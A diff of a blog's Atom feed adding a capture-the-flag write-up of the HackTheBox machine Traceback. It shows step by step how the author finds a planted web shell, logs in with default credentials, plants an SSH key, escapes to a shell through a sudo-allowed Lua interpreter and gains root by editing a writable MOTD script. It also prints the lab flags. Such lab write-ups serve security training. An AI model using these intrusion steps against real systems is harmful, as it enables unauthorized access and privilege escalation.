@@ -1,5 +1,222 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-08-10T10:35:00+02:00</updated><entry><title>Vulnhub: InfoSec Prep: OSCP</title><link href="https://maggick.fr/2020/08/vulnhub-infosec-prep-oscp.html" rel="alternate"></link><published>2020-08-10T10:35:00+02:00</published><updated>2020-08-10T10:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-10:/2020/08/vulnhub-infosec-prep-oscp.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.08/prep_oscp.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-08-19T09:00:00+02:00</updated><entry><title>HTB: Traceback</title><link href="https://maggick.fr/2020/08/htb-traceback.html" rel="alternate"></link><published>2020-08-19T09:00:00+02:00</published><updated>2020-08-19T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-19:/2020/08/htb-traceback.html</id><summary type="html">&lt;p&gt;&lt;img alt="Traceback Card" class="align-left" src="/media/2020.08/traceback_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/233"&gt;Traceback&lt;/a&gt; publish on
+Mars the 14th 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/21439"&gt;Xh4H&lt;/a&gt;.
+This box is rated as easy box. It implies some Google search, a lua interpreter
+and a privilege escalation using the MOTD.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.08/traceback_card.png" alt="Traceback Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/233"&gt;Traceback&lt;/a&gt; publish on
+Mars the 14th 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/21439"&gt;Xh4H&lt;/a&gt;.
+This box is rated as easy box. It implies some Google search, a lua interpreter
+and a privilege escalation using the MOTD.&lt;/p&gt;
+
+
+&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
+run a simple aggressive TCP scan:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Mar 26 04:41:18 2020 as: nmap -p- -sS -oN nmap 10.10.10.181&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.181&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.089s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Thu Mar 26 04:42:19 2020 -- 1 IP address (1 host up) scanned in 61.23 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The open ports are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;22: SSH&lt;/li&gt;
+&lt;li&gt;80: a web server&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We do not have any information to connect to the SSH server.&lt;/p&gt;
+&lt;p&gt;The website is a simple web page saying that the website has been hacked and
+that a backdoor is available for the net.&lt;/p&gt;
+&lt;p&gt;Running a &lt;code&gt;dirb&lt;/code&gt; or other web fuzzing tool doesn't give any result.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="homepage" src="/media/2020.08/traceback_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;Looking at the source code we found a commentary in the body: "Some of the best
+web shells that you might need".&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;This site has been owned&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h3&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; - Xh4H - &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h3&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="c"&gt;&amp;lt;!--Some of the best web shells that you might need ;)--&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;center&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The comment is the description of a &lt;a href="https://github.com/TheBinitGhimire/Web-Shells"&gt;github repository containing
+webshell&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We generate a wordlist from the webshell of this repository and launch it
+against the website with &lt;a href="https://github.com/ffuf/ffuf"&gt;ffuf&lt;/a&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./ffuf -w ~/htb_traceback/Web-Shells/list -u http://10.10.10.181/FUZZ -mc 200 -c -v&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        /&amp;#39;___\  /&amp;#39;___\           /&amp;#39;___\&lt;/span&gt;
+&lt;span class="code-line"&gt;      /\ \__/ /\ \__/  __  __  /\ \__/&lt;/span&gt;
+&lt;span class="code-line"&gt;      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\&lt;/span&gt;
+&lt;span class="code-line"&gt;        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/&lt;/span&gt;
+&lt;span class="code-line"&gt;        \ \_\   \ \_\  \ \____/  \ \_\&lt;/span&gt;
+&lt;span class="code-line"&gt;          \/_/    \/_/   \/___/    \/_/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;      v1.0.2&lt;/span&gt;
+&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Method           : GET&lt;/span&gt;
+&lt;span class="code-line"&gt;:: URL              : http://10.10.10.181/FUZZ&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Follow redirects : false&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Calibration      : false&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Timeout          : 10&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Threads          : 40&lt;/span&gt;
+&lt;span class="code-line"&gt;:: Matcher          : Response status: 200&lt;/span&gt;
+&lt;span class="code-line"&gt;________________________________________________&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;| URL | http://10.10.10.181/smevk.php&lt;/span&gt;
+&lt;span class="code-line"&gt;    * FUZZ: smevk.php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We go to the webshell page and found an authentication form.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="webshell homepage" src="/media/2020.08/traceback_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;According to Github the default credentials are "admin:admin". Once log id we
+can see a few interesting information:
+  * We are the user webadmin
+  * Our id is '1000' which mean we are a system user&lt;/p&gt;
+&lt;p&gt;&lt;img alt="webshell homepage" src="/media/2020.08/traceback_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;We change directory for &lt;code&gt;/home/webadmin/&lt;/code&gt;. We see that there is a
+&lt;code&gt;.ssh/authorized_keys&lt;/code&gt; file (maybe you need to create it if this doesn't exist,
+as I used the public server the folder and the file already existed).
+We add our public ssh key to the file and connect using ssh.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh 10.10.10.181 -lwebadmin&lt;/span&gt;
+&lt;span class="code-line"&gt;The authenticity of host &amp;#39;10.10.10.181 (10.10.10.181)&amp;#39; can&amp;#39;t be established.&lt;/span&gt;
+&lt;span class="code-line"&gt;ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.&lt;/span&gt;
+&lt;span class="code-line"&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: Permanently added &amp;#39;10.10.10.181&amp;#39; (ECDSA) to the list of known hosts.&lt;/span&gt;
+&lt;span class="code-line"&gt;#################################&lt;/span&gt;
+&lt;span class="code-line"&gt;-------- OWNED BY XH4H  ---------&lt;/span&gt;
+&lt;span class="code-line"&gt;- I guess stuff could have been configured better ^^ -&lt;/span&gt;
+&lt;span class="code-line"&gt;#################################&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Xh4H land&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Thu Mar 26 01:09:32 2020 from 10.10.17.253&lt;/span&gt;
+&lt;span class="code-line"&gt;webadmin@traceback:~$&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
+&lt;p&gt;In our home folder we found a note from sysadmin, the other system user about
+some lua tool.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;webadmin@traceback:~$ cat note.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;- sysadmin -&lt;/span&gt;
+&lt;span class="code-line"&gt;I have left a tool to practice Lua.&lt;/span&gt;
+&lt;span class="code-line"&gt;I&amp;#39;m sure you know where to find it.&lt;/span&gt;
+&lt;span class="code-line"&gt;Contact me if you have any question.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Looking at our &lt;code&gt;sudo&lt;/code&gt; right we have the possibility to execute &lt;code&gt;luvit&lt;/code&gt; as
+&lt;code&gt;sysadmin&lt;/code&gt; without password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;webadmin&lt;/span&gt;&lt;span class="nv"&gt;@traceback&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sudo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;Matching&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Defaults&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;entries&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;webadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;traceback&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;env_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mail_badpass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;secure_path&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="err"&gt;\:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;\:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="err"&gt;\:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;\:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="err"&gt;\:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;\:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;snap&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;User&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;webadmin&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;may&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;following&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;commands&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;traceback&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sysadmin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;NOPASSWD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sysadmin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;luvit&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We deduce that this is a lua interpreter and run some "Hello World".&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit &lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to the Luvit repl!&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt; print(&amp;quot;Hello World&amp;quot;)&lt;/span&gt;
+&lt;span class="code-line"&gt;Hello World&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;:::text&lt;/span&gt;
+&lt;span class="code-line"&gt;webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e &amp;#39;os.execute(&amp;quot;/bin/sh&amp;quot;)&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We go to our new home and read user.txt&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ bash&lt;/span&gt;
+&lt;span class="code-line"&gt;sysadmin@traceback:~$ cd /home/sysadmin/&lt;/span&gt;
+&lt;span class="code-line"&gt;sysadmin@traceback:/home/sysadmin$ ls&lt;/span&gt;
+&lt;span class="code-line"&gt;luvit  user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;sysadmin@traceback:/home/sysadmin$ cat user.txt &lt;/span&gt;
+&lt;span class="code-line"&gt;349f0968dce655cb15708bba0077d225&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As before we add our public ssh key to the user's &lt;code&gt;.ssh/authorized_keys&lt;/code&gt;.&lt;/p&gt;
+&lt;h1 id="root"&gt;root&lt;/h1&gt;
+&lt;p&gt;We do not know sysadmin's password required to list our &lt;code&gt;sudo&lt;/code&gt; right.&lt;/p&gt;
+&lt;p&gt;We run a simple &lt;code&gt;ps aux&lt;/code&gt; to know which process are running. We see (that's some
+luck) that root regularly execute the following command:
+&lt;code&gt;/bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root      28855  0.0  0.0   4628   856 ?        Ss   02:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We confirm that using &lt;a href="https://github.com/DominicBreuker/pspy"&gt;pspy&lt;/a&gt; (using ssh
+to copy the binary).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;2020/03/26 03:07:01 CMD: UID=0    PID=29213  | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ &lt;/span&gt;
+&lt;span class="code-line"&gt;2020/03/26 03:07:01 CMD: UID=0    PID=29212  | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When looking at the &lt;code&gt;/var/backups/.update-motd.d&lt;/code&gt; folder's permissions when see
+that we can not write in any file nor create a file as everything belong to
+&lt;code&gt;root&lt;/code&gt;. Nevertheless, the &lt;code&gt;/etc/update-motd.d/&lt;/code&gt; folder's permissions allow our
+user to write in any file. We create a temporary folder and add a command to the
+&lt;code&gt;00-header&lt;/code&gt; file. That command will copy the file &lt;code&gt;/root/root.txt&lt;/code&gt; and give us
+the permissions to read it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d$ ls -al&lt;/span&gt;
+&lt;span class="code-line"&gt;total 32&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .&lt;/span&gt;
+&lt;span class="code-line"&gt;drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  981 Mar 26 03:59 00-header&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  982 Mar 26 03:59 10-help-text&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin 4264 Mar 26 03:59 50-motd-news&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  604 Mar 26 03:59 80-esm&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwxrwxr-x  1 root sysadmin  299 Mar 26 03:59 91-release-upgrade&lt;/span&gt;
+&lt;span class="code-line"&gt;sysadmin@traceback:/etc/update-motd.d$ mkdir /tmp/ioio&lt;/span&gt;
+&lt;span class="code-line"&gt;sysadmin@traceback:/etc/update-motd.d$ echo &amp;#39;cp /root/root.txt /tmp/ioio &amp;amp;&amp;amp; chmod 777 /tmp/ioio/root.txt&amp;#39; &amp;gt;&amp;gt; 00-header&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then quickly trigger the command by initiating a new SSH connection. We can
+then grab the root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh sysadmin@10.10.10.181&lt;/span&gt;
+&lt;span class="code-line"&gt;#################################&lt;/span&gt;
+&lt;span class="code-line"&gt;-------- OWNED BY XH4H  ---------&lt;/span&gt;
+&lt;span class="code-line"&gt;- I guess stuff could have been configured better ^^ -&lt;/span&gt;
+&lt;span class="code-line"&gt;#################################&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Welcome to Xh4H land&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Last login: Thu Mar 26 03:57:28 2020 from 10.10.14.2&lt;/span&gt;
+&lt;span class="code-line"&gt;$ cat /tmp/ioio/*&lt;/span&gt;
+&lt;span class="code-line"&gt;07c8a04e829b07060576e3a799a33a9d&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;The box was quit easy and is really a nice one for beginner.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category></entry><entry><title>Vulnhub: InfoSec Prep: OSCP</title><link href="https://maggick.fr/2020/08/vulnhub-infosec-prep-oscp.html" rel="alternate"></link><published>2020-08-10T10:35:00+02:00</published><updated>2020-08-10T10:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-10:/2020/08/vulnhub-infosec-prep-oscp.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.08/prep_oscp.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a vulnhub machine
 &lt;a href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/"&gt;InfoSec Prep&lt;/a&gt;
 This box is an really easy box in order to make a small selection for entering a
